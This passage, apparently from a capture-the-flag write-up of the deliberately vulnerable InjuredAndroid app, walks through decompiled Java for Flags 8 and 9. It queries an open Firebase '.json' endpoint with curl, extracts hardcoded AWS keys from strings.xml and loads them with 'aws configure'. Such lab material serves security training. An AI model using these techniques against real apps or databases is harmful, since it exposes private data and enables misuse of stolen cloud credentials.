    f b2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
    d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;b2&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;FirebaseDatabase.getInstance()&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    d d2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; b2&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
    d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;d2&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;FirebaseDatabase.getInstance().reference&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;u&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; d2&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
    d h &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; d2&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;/aws&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;h&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;database.child(\&amp;#34;/aws\&amp;#34;)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;v&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; h&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The activity initializes firebase instance and fetches some information from the aws child node in the firebase storage model. Checking the above model if it is vulnerable to the .json trick of firebase, we get some information back as shown below&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:ret2csu$ curl https://injuredandroid.firebaseio.com/aws.json
&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;C10ud_S3cur1ty_lol&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next step is to analyze the onclick method of the application. This is the method that responds to events of an application that if you click an object defined by the in the code.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;onClick&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;FlagEightLoginActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;H&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;view &lt;span style=&#34;color:#5bc4bf&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
            Snackbar X &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; Snackbar&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;X&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;AWS CLI.&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            X&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;Y&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            X&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;N&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
            FlagEightLoginActivity flagEightLoginActivity &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; FlagEightLoginActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
            flagEightLoginActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;flagEightLoginActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;H&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; 1&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#815ba4&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
        d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;k&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;FlagEightLoginActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;H&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;!=&lt;/span&gt; 1&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;view &lt;span style=&#34;color:#5bc4bf&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
            Snackbar X2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; Snackbar&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;X&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;AWS profiles and credentials.&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            X2&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;Y&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            X2&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;N&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
            FlagEightLoginActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;0&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#815ba4&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
        d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;k&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above hints provided in the application, gives hint on using of AWS CLI and understanding of AWS profiles and credentials.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;what are the AWS profile stored?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Most of the strings are located in a file called &lt;strong&gt;strings.xml&lt;/strong&gt; in the resources directory which are referenced throughout the application. In strings.xml file we have two interesting strings as shown in the code snippet below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;string&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;AWS_ID&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;AKIAZ36DGKTUIOLDOBN6&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;string&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;AWS_SECRET&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;KKT4xQAQ5cKzJOsoSImlNFFTRxjYkoc71vuRP48S&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;AWS CLI is a unified tool to manage your AWS services, this enables one to configure the aws services  through command line and automate them through scripts.
To install &lt;strong&gt;aws-cli&lt;/strong&gt; on your linux machine type the following in your desktop terminal.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python -m pip install --user awscli
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For adding the aws profile, use the following command in the terminal as shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:~$ aws configure
AWS Access Key ID &lt;span style=&#34;color:#5bc4bf&#34;&gt;[&lt;/span&gt;None&lt;span style=&#34;color:#5bc4bf&#34;&gt;]&lt;/span&gt;: AKIAZ36DGKTUIOLDOBN6
AWS Secret Access Key &lt;span style=&#34;color:#5bc4bf&#34;&gt;[&lt;/span&gt;None&lt;span style=&#34;color:#5bc4bf&#34;&gt;]&lt;/span&gt;: KKT4xQAQ5cKzJOsoSImlNFFTRxjYkoc71vuRP48S
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;flag9--firebase&#34;&gt;Flag9- FireBase&lt;/h3&gt;
&lt;h4 id=&#34;what-is-firebase&#34;&gt;What is firebase?&lt;/h4&gt;
&lt;p&gt;Google firebase is a mobile and web application development platform that provides a real-time database that continuously syncs data between the cloud and the user’s mobile devices. Firebase databases are accessible via an API and that if developers have not correctly secured their firebase database, a simple web request can retrieve its entire content.&lt;/p&gt;
&lt;p&gt;We need to analyze the FlagNineFirebaseActivity in order to understand how read and write rules are implemented in the application.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;goToFlagNineFirebaseActivity&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        startActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; Intent&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; FlagNineFirebaseActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;));&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;FlagNineFirebaseActivity&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#fec418&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;[]&lt;/span&gt; decode &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; Base64&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;decode&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;ZmxhZ3Mv&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;     &lt;span style=&#34;color:#776e71&#34;&gt;//  flags/ 
&lt;/span&gt;&lt;span style=&#34;color:#776e71&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;v&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; decode&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
    d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;decode&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;decodedDirectory&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    Charset charset &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; StandardCharsets&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;UTF_8&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
    d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;charset&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;StandardCharsets.UTF_8&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;w&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; String&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;decode&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; charset&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    f b2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
    d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;b2&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;FirebaseDatabase.getInstance()&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    d d2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; b2&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
    d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;d2&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;FirebaseDatabase.getInstance().reference&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
